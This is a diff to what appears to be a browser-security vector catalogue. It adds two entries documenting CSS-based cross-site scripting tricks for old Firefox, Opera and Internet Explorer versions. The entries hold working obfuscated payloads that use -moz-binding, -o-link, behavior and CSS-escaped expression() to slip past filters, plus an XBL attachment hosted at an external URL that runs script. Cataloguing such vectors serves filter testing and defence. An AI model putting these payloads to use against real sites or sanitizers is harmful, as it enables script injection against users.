@@ -1053,7 +1053,7 @@ var items =
         'howtofix'   : {
             'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
             'ja' : '',
-            'ru' : 'Не разрешайте свойства поведений в разрешаемых пользователю стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
+            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML тегов.',
             'de' : ''
         },            
         'browsers'   : {
@@ -1861,5 +1861,81 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
         'reporter'   : 'hasegawayosuke'
+    },
+    { /* ID 60 - Obfuscation unsafe css-properties without encoding and backslash */
+        'id'         : 60,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Obfuscation unsafe css-properties without encoding and backslash',
+            'ja' : '',
+            'ru' : 'Обфускация опасных css-свойств без кодирования и обратного слеша',
+            'de' : ''
+        },
+        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(moztest.xml)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*behavior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*behavior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : 'http://heideri.ch/jso/moztest.xml',
+            'name'          : 'moztest.xml',
+            'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
+        },
+        'description': {
+            'en' : 'All browsers allow to use whitespace (\\x20,\\x09,\\x0A,\\x09) and css-comment before and after the properties. In addition, left curly brace ({) can precede the property in Opera and FF. IE allows to use many other non-alphanumeric characters and css-strings before and after (quirks mode only) properties. This is shown in the example. Also IE ignores NULL-character.',
+            'ja' : '',
+            'ru' : 'Все браузеры позволяют использовать пробельные символы (\\x20,\\x09,\\x0A,\\x09) и css-комментарии до и после свойств. Кроме того, в FF и Opera свойству может предшествовать левая фигурная скобка ({). IE допускает использовать множество других не буквенно-цифровых символов и строки до и после (только в режиме совместимости) свойств. Это показано в примере. Также IE игнорирует нулевой символ.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['1.5', '2.x', '3.x'],
+            'opera': ['8.x', '9.x', '10.x', 'mobile'],
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer'],
+        'reporter'   : 'LeverOne, sdc'
+    },
+    { /* ID 61 - CSS-encoding and backslashing */
+        'id'         : 61,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'CSS-encoding and backslashing',
+            'ja' : '',
+            'ru' : 'CSS-кодирование и добавление обратного слеша',
+            'de' : ''
+        },
+        'data'       : '<div style="x:e\\x\\000070\\00072\\65\\73 \\73	ion\\000028 %js_write%);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current">XXX',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : 'http://heideri.ch/jso/moztest.xml',
+            'name'          : 'moztest.xml',
+            'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
+        },
+        'description': {
+            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (for non-special characters only: \\x = x,\\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation.',
+            'ja' : '',
+            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (если при этом они не становятся специальными: \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией.',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'firefox': ['1.5', '2.x', '3.x'],
+            'opera': ['8.x', '9.x', '10.x', 'mobile'],
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
+        'reporter'   : 'Gareth, LeverOne,'
     }
 ]
